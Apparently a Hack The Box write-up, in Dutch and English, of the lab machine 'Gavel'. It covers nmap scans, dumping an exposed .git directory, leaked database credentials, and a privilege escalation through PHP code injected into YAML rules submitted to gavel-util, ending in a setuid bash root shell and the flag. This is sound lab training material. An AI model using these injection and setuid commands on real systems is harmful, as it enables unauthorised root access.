@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~] └─$ nmap 10.129.147.164 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 17:11 CET Nmap scan report for 10.129.147.164 Host is up (0.023s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the host.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/writeup-gavel/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~] └─$ nmap 10.129.147.164 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 17:11 CET Nmap scan report for 10.129.147.164 Host is up (0.023s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the host.">
+  <meta itemprop="wordCount" content="612">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~] └─$ nmap 10.129.147.164 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 17:11 CET Nmap scan report for 10.129.147.164 Host is up (0.023s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the host.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/writeup-gavel/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ nmap 10.129.147.164             
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 17:11 CET
+Nmap scan report for 10.129.147.164
+Host is up (0.023s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the host.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ nmap -p22,80 -sCV 10.129.147.164
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-01 17:12 CET
+Nmap scan report for gavel.htb (10.129.147.164)
+Host is up (0.020s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 1f:de:9d:84:bf:a1:64:be:1f:36:4f:ac:3c:52:15:92 (ECDSA)
+|_  256 70:a5:1a:53:df:d1:d0:73:3e:9d:90:ad:c1:aa:b4:19 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-title: Gavel Auction
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+| http-git: 
+|   10.129.147.164:80/.git/
+|     Git repository found!
+|     .git/config matched patterns &#39;user&#39;
+|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...
+|_    Last commit message: .. 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Hierboven kunnen we zien dat er een .git subdirectory is. Ik zal deze gaan afhalen door de GitHacker tool te gebruiken.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/Gavel/GitHacker]
+└─$ githacker --url http://gavel.htb/.git/ --output-folder result_gavel 
+2025-12-01 17:19:49 INFO 1 urls to be exploited
+2025-12-01 17:19:49 INFO Exploiting http://gavel.htb/.git/ into result_gavel/655fb9718d8950231d822e5e75498554
+2025-12-01 17:19:49 INFO Directory listing enable under: apache
+</code></pre><p>zoals je binnen de config.php file kunt zien is er interessante informatie te vinden over een database. We zullen deze waarschijnlijk straks nodig hebben.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/…/Gavel/GitHacker/result_gavel/655fb9718d8950231d822e5e75498554]
+└─$ cat includes/config.php 
+&lt;?php
+
+define(&#39;DB_HOST&#39;, &#39;localhost&#39;);
+define(&#39;DB_NAME&#39;, &#39;gavel&#39;);
+define(&#39;DB_USER&#39;, &#39;gavel&#39;);
+define(&#39;DB_PASS&#39;, &#39;gavel&#39;);
+
+define(&#39;ROOT_PATH&#39;, dirname(__DIR__));
+
+$basePath = rtrim(dirname($_SERVER[&#39;SCRIPT_NAME&#39;]), &#39;/&#39;);
+define(&#39;BASE_URL&#39;, $basePath);
+define(&#39;ASSETS_URL&#39;, $basePath . &#39;/assets&#39;);
+</code></pre><p>Als je naar de webpagina gaat en daar naar de .git subdirectory ben ik op de volgende informatie gekomen.</p>
+<pre tabindex="0"><code>[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = false
+	logallrefupdates = true
+[user]
+	name = sado
+	email = sado@gavel.htb
+</code></pre><p>binnen de admin.php file kunnen we zien dat er een user <code>auctioneer</code> is</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/…/Gavel/GitHacker/result_gavel/655fb9718d8950231d822e5e75498554]
+└─$ cat admin.php 
+&lt;?php
+require_once __DIR__ . &#39;/includes/config.php&#39;;
+require_once __DIR__ . &#39;/includes/db.php&#39;;
+require_once __DIR__ . &#39;/includes/session.php&#39;;
+require_once __DIR__ . &#39;/includes/auction.php&#39;;
+
+if (!isset($_SESSION[&#39;user&#39;]) || $_SESSION[&#39;user&#39;][&#39;role&#39;] !== &#39;auctioneer&#39;) {
+    header(&#39;Location: index.php&#39;);
+    exit;
+}
+</code></pre><pre tabindex="0"><code>auctioneer@gavel:/var/www/html/gavel/includes$ ls -la /opt/gavel/
+ls -la /opt/gavel/
+total 56
+drwxr-xr-x 4 root root  4096 Nov  5 12:46 .
+drwxr-xr-x 3 root root  4096 Nov  5 12:46 ..
+drwxr-xr-x 3 root root  4096 Nov  5 12:46 .config
+-rwxr-xr-- 1 root root 35992 Oct  3 19:35 gaveld
+-rw-r--r-- 1 root root   364 Sep 20 14:54 sample.yaml
+drwxr-x--- 2 root root  4096 Nov  5 12:46 submission
+</code></pre><pre tabindex="0"><code>auctioneer@gavel:~$  echo &#39;name: fixini&#39; &gt; fix_ini.yaml
+ echo &#39;name: fixini&#39; &gt; fix_ini.yaml
+auctioneer@gavel:~$ echo &#39;description: fix php ini&#39; &gt;&gt; fix_ini.yaml
+echo &#39;description: fix php ini&#39; &gt;&gt; fix_ini.yaml
+auctioneer@gavel:~$ echo &#39;image: &#34;x.png&#34;&#39; &gt;&gt; fix_ini.yaml
+echo &#39;image: &#34;x.png&#34;&#39; &gt;&gt; fix_ini.yaml
+auctioneer@gavel:~$ echo &#39;price: 1&#39; &gt;&gt; fix_ini.yaml
+echo &#39;price: 1&#39; &gt;&gt; fix_ini.yaml
+auctioneer@gavel:~$ echo &#39;rule_msg: &#34;fixini&#34;&#39; &gt;&gt; fix_ini.yaml
+echo &#39;rule_msg: &#34;fixini&#34;&#39; &gt;&gt; fix_ini.yaml
+auctioneer@gavel:~$ echo &#34;rule: file_put_contents(&#39;/opt/gavel/.config/php/php.ini&#39;, \&#34;engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\&#34;); return false;&#34; &gt;&gt; fix_ini.yaml
+&lt;le_functions=\\n\&#34;); return false;&#34; &gt;&gt; fix_ini.yaml
+auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/fix_ini.yaml
+&lt;bin/gavel-util submit /home/auctioneer/fix_ini.yaml
+</code></pre><pre tabindex="0"><code>auctioneer@gavel:~$ echo &#39;name: rootshell&#39; &gt; rootshell.yaml
+echo &#39;name: rootshell&#39; &gt; rootshell.yaml
+auctioneer@gavel:~$ echo &#39;description: make suid bash&#39; &gt;&gt; rootshell.yaml
+echo &#39;description: make suid bash&#39; &gt;&gt; rootshell.yaml
+auctioneer@gavel:~$ echo &#39;image: &#34;x.png&#34;&#39; &gt;&gt; rootshell.yaml
+echo &#39;image: &#34;x.png&#34;&#39; &gt;&gt; rootshell.yaml
+auctioneer@gavel:~$ echo &#39;price: 1&#39; &gt;&gt; rootshell.yaml
+echo &#39;price: 1&#39; &gt;&gt; rootshell.yaml
+auctioneer@gavel:~$ echo &#39;rule_msg: &#34;rootshell&#34;&#39; &gt;&gt; rootshell.yaml
+echo &#39;rule_msg: &#34;rootshell&#34;&#39; &gt;&gt; rootshell.yaml
+auctioneer@gavel:~$ echo &#34;rule: system(&#39;cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash&#39;); return false;&#34; &gt;&gt; rootshell.yaml
+&lt;/gavel/rootbash&#39;); return false;&#34; &gt;&gt; rootshell.yaml
+auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/rootshell.yaml
+&lt;n/gavel-util submit /home/auctioneer/rootshell.yaml
+</code></pre><p>Root Flag: c516af0ad1d4d5bab2f436086c1212e6</p>
+<pre tabindex="0"><code>rootbash-5.1# cat /root/root.txt
+cat /root/root.txt
+c516af0ad1d4d5bab2f436086c1212e6
+</code></pre><p>Rooted</p>
+<p>![[Pasted image 20251209195300.png]]</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
